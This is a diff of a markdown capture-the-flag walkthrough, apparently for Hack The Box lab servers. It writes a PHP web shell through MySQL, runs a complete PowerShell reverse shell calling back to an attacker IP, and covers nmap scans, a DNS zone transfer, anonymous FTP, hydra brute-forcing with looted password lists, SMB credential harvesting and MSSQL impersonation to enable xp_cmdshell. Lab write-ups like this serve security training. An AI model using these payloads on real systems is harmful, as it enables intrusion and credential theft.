+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
+```bash
 curl http://10.129.203.7/test.php
+```
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
+```
 # Hello World!
 ```
 
-```bash 
+</td></tr>
+</table>
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
+```bash
 mysql -h 10.129.203.7 -u <USER> -p
 
-# Enter password: 
+# Enter password:
 # Welcome to the MariaDB monitor.  Commands end with ; or \g.
 # Your MariaDB connection id is 27
 # Server version: 10.4.24-MariaDB mariadb.org binary distribution
@@ -3403,6 +4784,9 @@ mysql -h 10.129.203.7 -u <USER> -p
 
 # MariaDB [(none)]>
 ```
+
+</td></tr>
+</table>
 
 ```mermaid
 flowchart LR
@@ -3421,41 +4805,122 @@ flowchart LR
 
 I have two key pieces of information:
 
-* Write access to the FTP server as `<USER>`.
-* The directory of the Apache web server is "C:\xampp\htdocs\".
+- Write access to the FTP server as `<USER>`.
+- The directory of the Apache web server is "C:\xampp\htdocs\".
 
 The goal now is to use the FTP access to upload a web shell into the Apache directory so I can execute commands on the server.
 
-```bash 
-MariaDB [(none)]> SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE 'C:\\xampp\\htdocs\\shell.php';
+<table width="100%">
+<tr><td colspan="2"> 🐬 <b>MySQL</b> </td></tr>
+<tr><td width="20%">**`MariaDB [(none)]>`**</td><td>
+
+```sql
+SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE 'C:\\xampp\\htdocs\\shell.php';
+```
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
+```
 # Query OK, 1 row affected (0.068 sec)
 ```
 
-```bash 
+</td></tr>
+</table>
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
+```bash
 curl "http://10.129.203.7/shell.php?cmd=whoami"
+```
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
+```
 # nt authority\system
 ```
 
-```bash 
+</td></tr>
+</table>
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
+```bash
 sudo nc -lvnp 4444
 ```
 
-```bash 
+</td></tr>
+</table>
+
+**Create the reverse shell script:**
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
+```bash
 nano rev.ps1
 ```
-```ps1 
+
+</td></tr>
+</table>
+
+<table width="100%">
+<tr><td colspan="2"> ⚡ <b>rev.ps1</b> </td></tr>
+<tr><td colspan="2">
+
+```powershell
 $client = New-Object System.Net.Sockets.TCPClient("10.10.15.130",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
 
-```bash 
+</td></tr>
+</table>
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
+```bash
 iconv -t UTF-16LE rev.ps1 | base64 -w 0
+```
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
+```
 # JABjAGwAaQB...AoACkACgA=
 ```
-```bash 
+
+</td></tr>
+</table>
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
+```bash
 curl "http://10.129.203.7/shell.php?cmd=powershell%20-e%20JABjAGwAaQB...AoACkACgA="
 ```
 
-```bash 
+</td></tr>
+</table>
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
+```bash
 sudo nc -lvnp 4444
 # listening on [any] 4444 ...
 # connect to [10.10.15.130] from (UNKNOWN) [10.129.203.7] 49682
@@ -3465,31 +4930,34 @@ whoami
 PS C:\xampp\htdocs> ls
 # Directory: C:\xampp\htdocs
 
-# Mode                LastWriteTime         Length Name                                                                  
-# ----                -------------         ------ ----                                                                  
-# d-----        4/22/2022   9:17 AM                dashboard                                                             
-# d-----        4/22/2022   9:17 AM                img                                                                   
-# d-----        4/22/2022   9:16 AM                webalizer                                                             
-# d-----        4/22/2022   9:17 AM                xampp                                                                 
-# -a----        8/27/2019   9:02 AM           3607 applications.html                                                     
-# -a----        8/27/2019   9:02 AM            177 bitnami.css                                                           
-# -a----        7/16/2015  10:32 AM          30894 favicon.ico                                                           
-# -a----        7/16/2015  10:32 AM            260 index.php                                                             
-# -a----        9/18/2025  10:02 PM             31 shell.php                                                             
-# -a----        4/22/2022  10:02 AM             29 test.php                                                              
+# Mode                LastWriteTime         Length Name
+# ----                -------------         ------ ----
+# d-----        4/22/2022   9:17 AM                dashboard
+# d-----        4/22/2022   9:17 AM                img
+# d-----        4/22/2022   9:16 AM                webalizer
+# d-----        4/22/2022   9:17 AM                xampp
+# -a----        8/27/2019   9:02 AM           3607 applications.html
+# -a----        8/27/2019   9:02 AM            177 bitnami.css
+# -a----        7/16/2015  10:32 AM          30894 favicon.ico
+# -a----        7/16/2015  10:32 AM            260 index.php
+# -a----        9/18/2025  10:02 PM             31 shell.php
+# -a----        4/22/2022  10:02 AM             29 test.php
 
 PS C:\xampp> cd C:\Users\Administrator\Desktop
 PS C:\Users\Administrator\Desktop> ls
 
 # Directory: C:\Users\Administrator\Desktop
 
-# Mode                LastWriteTime         Length Name                                                                  
-# ----                -------------         ------ ----                                                                  
-# -a----        4/22/2022  10:36 AM             39 flag.txt                                                              
+# Mode                LastWriteTime         Length Name
+# ----                -------------         ------ ----
+# -a----        4/22/2022  10:36 AM             39 flag.txt
 
 PS C:\Users\Administrator\Desktop> cat flag.txt
 # <FLAG>
 ```
+
+</td></tr>
+</table>
 
 ```mermaid
 flowchart LR
@@ -3598,22 +5066,32 @@ The second server is an internal server (within the inlanefreight.htb domain) th
 
 I started enumerating the ports, their service version and running the default scripts to have a big picture of my target machine.
 
-```bash 
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
+```bash
 sudo nmap -p- -sC -sV -Pn 10.129.157.24
 ```
-```bash 
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
+```
 # Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-22 20:42 CDT
 # Nmap scan report for 10.129.157.24
 # Host is up (0.067s latency).
 # Not shown: 65529 closed tcp ports (reset)
 # PORT      STATE SERVICE  VERSION
 # 22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
-# | ssh-hostkey: 
+# | ssh-hostkey:
 # |   3072 71:08:b0:c4:f3:ca:97:57:64:97:70:f9:fe:c5:0c:7b (RSA)
 # |   256 45:c3:b5:14:63:99:3d:9e:b3:22:51:e5:97:76:e1:50 (ECDSA)
 # |_  256 2e:c2:41:66:46:ef:b6:81:95:d5:aa:35:23:94:55:38 (ED25519)
 # 53/tcp    open  domain   ISC BIND 9.16.1 (Ubuntu Linux)
-# | dns-nsid: 
+# | dns-nsid:
 # |_  bind.version: 9.16.1-Ubuntu
 # 110/tcp   open  pop3     Dovecot pop3d
 # |_ssl-date: TLS randomness does not represent time
@@ -3630,27 +5108,40 @@ sudo nmap -p- -sC -sV -Pn 10.129.157.24
 # |_ssl-date: TLS randomness does not represent time
 # |_pop3-capabilities: TOP SASL(PLAIN) UIDL RESP-CODES USER AUTH-RESP-CODE PIPELINING CAPA
 # 2121/tcp  open  ftp
-# | fingerprint-strings: 
-# |   GenericLines: 
+# | fingerprint-strings:
+# |   GenericLines:
 # |     220 ProFTPD Server (InlaneFTP) [10.129.157.24]
 # |     Invalid command: try being more creative
 # |     Invalid command: try being more creative
-# |   NULL: 
+# |   NULL:
 # |_    220 ProFTPD Server (InlaneFTP) [10.129.157.24]
 # 30021/tcp open  ftp
-# | fingerprint-strings: 
-# |   GenericLines: 
+# | fingerprint-strings:
+# |   GenericLines:
 # |     220 ProFTPD Server (Internal FTP) [10.129.157.24]
 # |     Invalid command: try being more creative
 # |     Invalid command: try being more creative
-# |   NULL: 
+# |   NULL:
 # |_    220 ProFTPD Server (Internal FTP) [10.129.157.24]
 ```
 
-```bash 
+</td></tr>
+</table>
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
+```bash
 dig AXFR @10.129.157.24 inlanefreight.htb
 ```
-```bash 
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
+```
 # ; <<>> DiG 9.18.33-1~deb12u2-Debian <<>> AXFR @10.129.157.24 inlanefreight.htb
 # ; (1 server found)
 # ;; global options: +cmd
@@ -3673,15 +5164,20 @@ dig AXFR @10.129.157.24 inlanefreight.htb
 # ;; XFR size: 13 records (messages 1, bytes 372)
 ```
 
-```bash 
+</td></tr>
+</table>
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
+```bash
 ftp 10.129.157.24 30021
-```
-```bash 
 # Connected to 10.129.157.24.
 # 220 ProFTPD Server (Internal FTP) [10.129.157.24]
 Name (10.129.157.24:root): anonymous
 # 331 Anonymous login ok, send your complete email address as your password
-Password: 
+Password:
 # 230 Anonymous access granted, restrictions apply
 # Remote system type is UNIX.
 # Using binary mode to transfer files.
@@ -3703,17 +5199,30 @@ ftp> get mynotes.txt
 # local: mynotes.txt remote: mynotes.txt
 # 200 EPRT command successful
 # 150 Opening BINARY mode data connection for mynotes.txt (153 bytes)
-# 100% |*************************************************************************************************|   153       52.83 KiB/s    00:00 ETA
+# 100% |*******************************************************************************|   153       52.83 KiB/s    00:00 ETA
 # 226 Transfer complete
 # 153 bytes received in 00:00 (2.09 KiB/s)
 ftp> exit
 # 221 Goodbye.
 ```
 
-```bash 
-cat mynotes.txt 
+</td></tr>
+</table>
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
+```bash
+cat mynotes.txt
 ```
-```bash 
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
+```
 # <PASSWORD1>
 # <PASSWORD2>
 # <PASSWORD3>
@@ -3724,10 +5233,23 @@ cat mynotes.txt
 # <PASSWORD8>
 ```
 
-```bash 
+</td></tr>
+</table>
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
+```bash
 hydra -l <USER> -P ./mynotes.txt ftp://10.129.157.24:2121/ -vV
 ```
-```bash 
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
+```
 # Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 # Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-22 21:05:13
@@ -3748,15 +5270,20 @@ hydra -l <USER> -P ./mynotes.txt ftp://10.129.157.24:2121/ -vV
 # Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-22 21:05:23
 ```
 
-```bash 
+</td></tr>
+</table>
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
+```bash
 ftp 10.129.157.24 2121
-```
-```bash 
 # Connected to 10.129.157.24.
 # 220 ProFTPD Server (InlaneFTP) [10.129.157.24]
 Name (10.129.157.24:root): "<USER>"
 # 331 Password required for <USER>
-Password: 
+Password:
 # 230 User <USER> logged in
 # Remote system type is UNIX.
 # Using binary mode to transfer files.
@@ -3770,17 +5297,35 @@ ftp> get flag.txt
 # local: flag.txt remote: flag.txt
 # 229 Entering Extended Passive Mode (|||1522|)
 # 150 Opening BINARY mode data connection for flag.txt (29 bytes)
-#     29       13.50 KiB/s 
+#     29       13.50 KiB/s
 # 226 Transfer complete
 # 29 bytes received in 00:00 (0.41 KiB/s)
 ftp> exit
 # 221 Goodbye.
 ```
 
-```bash 
+</td></tr>
+</table>
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
+```bash
 cat flag.txt
+```
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
+```
 # <FLAG>
 ```
+
+</td></tr>
+</table>
 
 </details>
 
@@ -3794,8 +5339,20 @@ The third server is another internal server used to manage files and working mat
 <details>
 <summary><h3>Enumeration</h3></summary>
 
-```bash 
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
+```bash
 sudo nmap -p- -sC -sV -Pn <TARGET_IP>
+```
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
+```
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-23 21:22 CDT
 Nmap scan report for <TARGET_IP>
 Host is up (0.066s latency).
@@ -3804,17 +5361,17 @@ PORT     STATE SERVICE       VERSION
 135/tcp  open  msrpc         Microsoft Windows RPC
 445/tcp  open  microsoft-ds?
 1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
-| ms-sql-ntlm-info: 
-|   <TARGET_IP>:1433: 
+| ms-sql-ntlm-info:
+|   <TARGET_IP>:1433:
 |     Target_Name: WIN-HARD
 |     NetBIOS_Domain_Name: WIN-HARD
 |     NetBIOS_Computer_Name: WIN-HARD
 |     DNS_Domain_Name: WIN-HARD
 |     DNS_Computer_Name: WIN-HARD
 |_    Product_Version: 10.0.17763
-| ms-sql-info: 
-|   <TARGET_IP>:1433: 
-|     Version: 
+| ms-sql-info:
+|   <TARGET_IP>:1433:
+|     Version:
 |       name: Microsoft SQL Server 2019 RTM
 |       number: 15.00.2000.00
 |       Product: Microsoft SQL Server 2019
@@ -3830,7 +5387,7 @@ PORT     STATE SERVICE       VERSION
 | ssl-cert: Subject: commonName=WIN-HARD
 | Not valid before: 2025-09-23T02:18:53
 |_Not valid after:  2026-03-25T02:18:53
-| rdp-ntlm-info: 
+| rdp-ntlm-info:
 |   Target_Name: WIN-HARD
 |   NetBIOS_Domain_Name: WIN-HARD
 |   NetBIOS_Computer_Name: WIN-HARD
@@ -3841,16 +5398,19 @@ PORT     STATE SERVICE       VERSION
 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 
 Host script results:
-| smb2-time: 
+| smb2-time:
 |   date: 2025-09-24T02:26:18
 |_  start_date: N/A
-| smb2-security-mode: 
-|   3:1:1: 
+| smb2-security-mode:
+|   3:1:1:
 |_    Message signing enabled but not required
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 292.33 seconds
 ```
+
+</td></tr>
+</table>
 
 </details>
 
@@ -3859,7 +5419,11 @@ Nmap done: 1 IP address (1 host up) scanned in 292.33 seconds
 
 Listing the service
 
-```bash 
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
+```bash
 smbclient -L <TARGET_IP>
 # Password for [WORKGROUP\htb-ac-1640397]:
 
@@ -3867,7 +5431,7 @@ smbclient -L <TARGET_IP>
 # 	---------       ----      -------
 # 	ADMIN$          Disk      Remote Admin
 # 	C$              Disk      Default share
-# 	Home            Disk      
+# 	Home            Disk
 # 	IPC$            IPC       Remote IPC
 # Reconnecting with SMB1 for workgroup listing.
 # do_connect: Connection to <TARGET_IP> failed (Error NT_STATUS_IO_TIMEOUT)
@@ -3894,12 +5458,19 @@ smb: \IT\> dir
 # 		7706623 blocks of size 4096. 3143783 blocks available
 ```
 
+</td></tr>
+</table>
+
 <details>
 <summary><h4>Fiona</h4></summary>
 
 Listing Fiona
 
-```bash 
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
+```bash
 smb: \IT\Fiona\> dir
 #   .                                   D        0  Thu Apr 21 15:11:53 2022
 #   ..                                  D        0  Thu Apr 21 15:11:53 2022
@@ -3912,10 +5483,23 @@ Get file creds.txt? yes
 # getting file \IT\Fiona\creds.txt of size 118 as creds.txt (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)
 ```
 
-```bash 
+</td></tr>
+</table>
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
+```bash
 cat creds.txt
 ```
-```bash
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
+```
 # Windows Creds
 
 # kAkd03SA@#!
@@ -3925,6 +5509,9 @@ cat creds.txt
 # SecureLocationforPasswordsd123!!
 ```
 
+</td></tr>
+</table>
+
 </details>
 
 <details>
@@ -3932,7 +5519,11 @@ cat creds.txt
 
 Listing John
 
-```bash 
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
+```bash
 smb: \IT\John\> dir
 #   .                                   D        0  Thu Apr 21 16:15:09 2022
 #   ..                                  D        0  Thu Apr 21 16:15:09 2022
@@ -3951,25 +5542,66 @@ Get file secrets.txt? yes
 # getting file \IT\John\secrets.txt of size 99 as secrets.txt (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)
 ```
 
-```bash 
+</td></tr>
+</table>
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
+```bash
 cat information.txt
 ```
-```bash 
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
+```
 # To do:
 # - Keep testing with the database.
 # - Create a local linked server.
 # - Simulate Impersonation.
 ```
-```bash 
+
+</td></tr>
+</table>
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
+```bash
 cat notes.txt
 ```
-```bash 
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
+```
 # Hack The Box is a massive, online cybersecurity training platform, allowing individuals, companies, universities and all kinds of organizations around the world ...
 ```
-```bash 
+
+</td></tr>
+</table>
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
+```bash
 cat secrets.txt
 ```
-```bash 
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
+```
 # Password Lists:
 
 # 1234567
@@ -3979,6 +5611,9 @@ cat secrets.txt
 # TestingDB123
 ```
 
+</td></tr>
+</table>
+
 </details>
 
 <details>
@@ -3986,7 +5621,11 @@ cat secrets.txt
 
 Listing Simon
 
-```bash 
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
+```bash
 smb: \IT\Simon\> dir
 #   .                                   D        0  Thu Apr 21 16:16:07 2022
 #   ..                                  D        0  Thu Apr 21 16:16:07 2022
@@ -3999,10 +5638,23 @@ Get file random.txt? yes
 # getting file \IT\Simon\random.txt of size 94 as random.txt (0.3 KiloBytes/sec) (average 0.4 KiloBytes/sec)
 ```
 
-```bash 
+</td></tr>
+</table>
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
+```bash
 cat random.txt
 ```
-```bash 
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
+```
 # Credentials
 
 # (k20ASD10934kadA
@@ -4012,6 +5664,9 @@ cat random.txt
 # LKads9kasd0-@
 ```
 
+</td></tr>
+</table>
+
 </details>
 
 </details>
@@ -4019,10 +5674,20 @@ cat random.txt
 <details>
 <summary><h3>Brute-force</h3></summary>
 
-```bash 
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
+```bash
 hydra -l fiona -P ./creds.txt <TARGET_IP> rdp
 ```
-```bash 
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
+```
 # Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 # Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-24 21:43:27
@@ -4036,42 +5701,47 @@ hydra -l fiona -P ./creds.txt <TARGET_IP> rdp
 # Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-24 21:43:29
 ```
 
+</td></tr>
+</table>
+
 </details>
 
 <details>
 <summary><h3>MSSQL</h3></summary>
 
-```bash 
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
+```bash
 sqsh -S <TARGET_IP> -U '.\\fiona' -P '<PASSWORD>' -h
-```
-```bash 
 sqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray
 Portions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp
 This is free software with ABSOLUTELY NO WARRANTY
 For more information type '\warranty'
 1> SELECT srvname, isremote FROM sysservers
 2> go
-        WINSRV02\SQLEXPRESS                        
+        WINSRV02\SQLEXPRESS
                1
 
-        LOCAL.TEST.LINKED.SRV                                        
+        LOCAL.TEST.LINKED.SRV
                0
 
 1> SELECT distinct b.name
-FROM sys.server_permissions a 
-INNER JOIN sys.server_principals b 
-ON a.grantor_principal_id = b.principal_id 
+FROM sys.server_permissions a
+INNER JOIN sys.server_principals b
+ON a.grantor_principal_id = b.principal_id
 WHERE a.permission_name = 'IMPERSONATE'
 2> go
 
         john
-        simon  
+        simon
 
 1> EXECUTE AS LOGIN = 'john'
-SELECT SYSTEM_USER 
-SELECT IS_SRVROLEMEMBER('sysadmin') 
+SELECT SYSTEM_USER
+SELECT IS_SRVROLEMEMBER('sysadmin')
 2> go
-        john                                                           
+        john
            0
 
 1> SELECT * FROM openquery("LOCAL.TEST.LINKED.SRV", 'SELECT is_srvrolemember(''sysadmin'')')
@@ -4081,14 +5751,14 @@ SELECT IS_SRVROLEMEMBER('sysadmin')
 1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [LOCAL.TEST.LINKED.SRV]
 2> go
 
-        WINSRV02\SQLEXPRESS      
+        WINSRV02\SQLEXPRESS
 
-        Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64) 
-        Sep 24 2019 13:48:23 
+        Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)
+        Sep 24 2019 13:48:23
         Copyright (C) 2019 Microsoft Corporation
         Express Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64> (Build 17763: ) (Hypervisor)
 
-        testadmin                       
+        testadmin
                   1
 
 1> EXECUTE('
@@ -4102,13 +5772,16 @@ SELECT IS_SRVROLEMEMBER('sysadmin')
 Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
 Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
 
-        nt authority\system   
+        nt authority\system
 
 1> EXECUTE('EXEC xp_cmdshell ''type C:\Users\Administrator\Desktop\flag.txt''') AT [LOCAL.TEST.LINKED.SRV];
 2> go
 
-        <FLAG>      
+        <FLAG>
 ```
+
+</td></tr>
+</table>
 
 </details>
 
